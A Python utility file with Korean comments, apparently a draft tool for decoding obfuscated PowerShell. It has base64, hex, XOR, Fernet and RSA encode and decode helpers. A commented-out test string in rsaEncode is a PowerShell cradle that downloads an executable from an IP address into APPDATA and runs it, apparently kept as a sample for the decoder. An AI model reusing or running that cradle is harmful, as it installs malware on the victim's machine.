import base64

from tkinter import filedialog
from cryptography.fernet import Fernet
from Crypto import Random
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5 as Cipher_pkcs1_v1_5


def decode_base64(file_path):
    f_origin = open(file_path, 'r')
    f_decoding = open("psParser1.txt", 'w')
    while True:
        line = f_origin.readline()
        if not line: break
        context = base64.b64decode(line)
        print("디코딩 내용 : ", context)
        f_decoding.write(context.decode("ascii", errors="strict"))
        f_decoding.write("\n")

    f_origin.close()
    f_decoding.close()

def decode_hex(file_path):
    f_origin = open(file_path, 'r')
    f_decoding = open("psParser1.txt", 'w')
    while True:
        line = f_origin.readline()
        if not line: break
        context = bytearray.fromhex(line)
        context.decode()
        print("디코딩 내용 : ", context)
        f_decoding.write(context.decode("ascii", errors="strict"))
        f_decoding.write("\n")

    f_origin.close()
    f_decoding.close()

def xor_encode_decode(file_path): #테스트 # ;기준으로 날라가는거 같은데 그거 나중에 확인 # 완전 정확하게 encode가 안되는거 같은데 왜 그런거지?
    d = open(file_path, 'r').read()
    data = d
    print("here0 : ", data)


    key = "12345"

    ret = ''
    for i in range(len(data)):
        ret += chr(ord(data[i]) ^ ord(key[i % len(key)]))

    print("here1 : ", ret)
    print("here2: ", ret.encode())

    f = open("test.txt", 'w')
    f.write(ret)
    f.close()

    # f = open("test.txt", 'r')
    # line = f.readline()
    # print("here3 : ", line)
    # f.close()

    # d = open("test.txt", 'r').read()
    # data = d
    # key = '4'

    f = open("test.txt", 'r')
    line = f.readline()
    data = line

    ret = ''
    for i in range(len(data)):
        ret += chr(ord(data[i]) ^ ord(key[i % len(key)]))

    print("here4 : ", ret)





def xor_encode(file_path):
    d = open(file_path, 'r').read()

    data = d
    key = '4'

    ret = ''
    for i in range(len(data)):
        ret += chr(ord(data[i]) ^ ord(key[i % len(key)]))

    print("here1 : ", ret)



def xor_decode(file_path):
    # d = open(path_origin, 'r').read()
    # data = d
    # key = '4'
    #
    # ret = ''
    # for i in range(len(data)):
    #     ret += chr(ord(data[i]) ^ ord(key[i % len(key)]))
    #
    # print("here2 : ", ret)

    f = open(file_path, 'r')
    line = f.readline()
    data = line

    f = open(open_key(), 'r')
    key = f.readline()

    ret = ''
    for i in range(len(data)):
        ret += chr(ord(data[i]) ^ ord(key[i % len(key)]))

    f_decoding = open("psParser1.txt", 'w')
    f_decoding.write(ret)
    f.close()

    print("here4 : ", ret)

def xor(file_path):
    d = open(file_path, 'r').read()

    data = d
    key = '4'

    ret = ''
    for i in range(len(data)):
        ret += chr(ord(data[i]) ^ ord(key[i % len(key)]))

    print("here1 : ", ret)

    data = ret
    ret = ''
    for i in range(len(data)):
        ret += chr(ord(data[i]) ^ ord(key[i % len(key)]))

    print("here2 : ", ret)

def symmetricKey(file_path):
    d = open(file_path, 'r').read()
    print(d.encode())

    key = Fernet.generate_key()
    print(f'대칭키 : {key}')
    f = open("key.txt", 'w')
    f.write(key.decode())
    f.close()

    fernet = Fernet(key)
    encrypt_str = fernet.encrypt(d.encode())

    print("암호화된 문자열 : ", encrypt_str)

    f = open("test.txt", 'w')
    f.write(encrypt_str.decode())
    f.close()

    decrypt_str = fernet.decrypt(encrypt_str)
    print("복호화된 문자열 : ", decrypt_str)

def decode_symmetric(file_path):
    d = open(file_path, 'r').read()
    print(d.encode())

    f = open(open_key(), 'r')
    key = f.readline()

    fernet = Fernet(key)
    decrypt_str = fernet.decrypt(d)
    print("복호화된 문자열 : ", decrypt_str)

    f_decoding = open("psParser1.txt", 'w')
    f_decoding.write(decrypt_str.decode())
    f.close()


def rsaEncode(file_path):
    random_generator = Random.new().read
    rsa = RSA.generate(1024, random_generator)
    private_pem = rsa.exportKey()
    with open("private.pem", "wb") as f:
        f.write(private_pem)
        f.close()
    public_pem = rsa.publickey().exportKey()
    with open("public.pem", "wb") as f:
        f.write(public_pem)
        f.close()

    message = "Hello,This is RSA  "
    # message = '''(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")'''
    # message = open(file_path, 'r').read()
    print(message)
    rsakey = RSA.importKey(open("public.pem").read())
    cipher = Cipher_pkcs1_v1_5.new(rsakey)  # pkcs1_v1_5
    cipher_text = base64.b64encode(cipher.encrypt(message.encode('utf-8')))
    print(cipher_text.decode('utf-8'))
    print("here1")

def rsaDecode():
    # 밑에꺼 읽어오는거 확인하기
    cipher_text = "V62K8w2L4xAZ0wrMlzh+cGn7AY3Anp4P01KWk75hlDx6Zqe2MbRXdpfdO4eOtDqdgiS2V8nQhNTIjnYMtN1FTisOwGictzgzfsfAcNTTuVcHoOLmfSXtokhUSO+44ydCeDMs/VCs+AcFZZAk8J+R9pXtlUx8aNnhVQIby2K8WVU="
    encrypt_text = cipher_text.encode('utf-8')
    rsakey = RSA.importKey(open("private.pem").read())
    cipher = Cipher_pkcs1_v1_5.new(rsakey)  # pkcs1_v1_5
    text = cipher.decrypt(base64.b64decode(encrypt_text), "    ")
    print(text.decode('utf-8'))
    print("here2")

def open_key():
    key_path = filedialog.askopenfilename(filetypes=[('Key File','.txt')])
    key_path = key_path.replace('\\', '/')
    print("키 경로 : ", key_path)
    if key_path == '':
        print("키 경로를 찾을 수 없습니다.")
        exit()
    else:
        print("키 업로드 완료")
        print("\n")

    return key_path